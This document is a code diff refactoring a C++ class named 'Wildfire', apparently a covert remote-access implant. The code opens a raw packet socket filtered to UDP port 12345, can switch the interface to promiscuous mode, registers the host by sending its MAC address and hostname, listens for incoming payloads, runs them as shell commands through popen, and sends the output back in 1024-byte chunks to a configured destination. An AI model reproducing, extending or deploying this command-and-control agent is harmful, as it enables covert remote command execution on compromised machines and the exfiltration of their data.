@@ -15,8 +15,10 @@ Wildfire::Wildfire(std::string dst_ip, int dst_port, bool DEBUG, bool PROMISC) {
 
   memset(this->iface, '\0', sizeof(this->iface));
   this->GetInterfaceName(this->iface);
+}
 
-  /* BPF code generated with tcpdump -dd udp and port 12345
+void Wildfire::OpenSocket(){
+ /* BPF code generated with tcpdump -dd udp and port 12345
    * used to filter incoming packets at the socket level
    */
   struct sock_filter bpf_code[] = {
@@ -84,6 +86,22 @@ Wildfire::Wildfire(std::string dst_ip, int dst_port, bool DEBUG, bool PROMISC) {
       if (this->DEBUG) std::perror("setsockopt");
 }
 
+void Wildfire::CloseSocket(){
+  //if promiscuous mode was on, turn it off
+  if (Wildfire::Instance->PROMISC){
+      if (ioctl(Wildfire::Instance->sockfd, SIOCGIFFLAGS, Wildfire::Instance->sifreq) == -1){
+          if (Wildfire::Instance->DEBUG) std::perror("ioctl GIFFLAGS");
+      }
+      Wildfire::Instance->sifreq->ifr_flags ^= IFF_PROMISC;
+      if (ioctl(Wildfire::Instance->sockfd, SIOCSIFFLAGS, Wildfire::Instance->sifreq) == -1){
+          if (Wildfire::Instance->DEBUG) std::perror("ioctl SIFFLAGS");
+      }
+  }
+  //shut it down!
+  free(Wildfire::Instance->sifreq);
+  close(Wildfire::Instance->sockfd);
+}
+
 // Null, because instance will be initialized on demand.
 Wildfire* Wildfire::Instance = NULL;
 
@@ -109,8 +127,6 @@ Wildfire *Wildfire::Init(std::string dst_ip, int dst_port, bool DEBUG, bool PROM
     Wildfire::Instance->SetInterfaceMac();
     // setup SIGINT handler
     std::signal(SIGINT, Wildfire::StaticSignalHandler);
-
-
   }
   return Wildfire::Instance;
 }
@@ -129,23 +145,10 @@ void Wildfire::Register(){
                             this->interface_mac[2], this->interface_mac[3],
                             this->interface_mac[4], this->interface_mac[5]);
   std::string mac = std::string(reinterpret_cast<const char*>(uc_Mac));
-  return this->SendChunk(mac + std::string{"|"} + Wildfire::GetHostname());
+  this->SendChunk(mac + std::string{"|"} + Wildfire::GetHostname());
 }
 
 void Wildfire::End(){
-  //if promiscuous mode was on, turn it off
-  if (Wildfire::Instance->PROMISC){
-      if (ioctl(Wildfire::Instance->sockfd, SIOCGIFFLAGS, Wildfire::Instance->sifreq) == -1){
-          if (Wildfire::Instance->DEBUG) std::perror("ioctl GIFFLAGS");
-      }
-      Wildfire::Instance->sifreq->ifr_flags ^= IFF_PROMISC;
-      if (ioctl(Wildfire::Instance->sockfd, SIOCSIFFLAGS, Wildfire::Instance->sifreq) == -1){
-          if (Wildfire::Instance->DEBUG) std::perror("ioctl SIFFLAGS");
-      }
-  }
-  //shut it down!
-  free(Wildfire::Instance->sifreq);
-  close(Wildfire::Instance->sockfd);
   delete Wildfire::Instance;
 }
 
@@ -173,6 +176,8 @@ void Wildfire::Run(){
 
 void Wildfire::RunOnce() {
   std::string payload = Wildfire::Instance->ListenOnce();
+
+  std::cout << payload << "\n";
 
   //checkup on the service, make sure it is still there
   int pipe_index = payload.find("|");
@@ -207,12 +212,16 @@ void Wildfire::RunOnce() {
   pclose(fd);
   std::string cmdOutStr(reinterpret_cast<char*>((comout)));
   std::string response = (uuid+cmdOutStr).substr(0, (uuid+cmdOutStr).size()-6);
+  Wildfire::Instance->Send(response);
+}
+
+void Wildfire::Send(std::string payload){
   int i = 0;
   std::string chunk;
-  while(i < response.size()){
-    int offset =  (i+1024) < response.size() ? 1024 : response.size()-i;
-    chunk = response.substr(i, offset);
-    Wildfire::Instance->SendChunk(chunk);
+  while(i < payload.size()){
+    int offset =  (i+1024) < payload.size() ? 1024 : payload.size()-i;
+    chunk = payload.substr(i, offset);
+    this->SendChunk(chunk);
     i += 1024;
   }
 }
@@ -344,7 +353,6 @@ void Wildfire::SendChunk(std::string chunk){
   std::memset(&frame, 0, sizeof(frame));
   chunk.copy((char*)frame.data, chunk_size);
   //std::strncpy((char*)frame.data, chunk.c_str(), chunk.size());
-
 
   //get the ifindex
   if (ioctl(this->sockfd, SIOCGIFINDEX, this->sifreq) == -1){
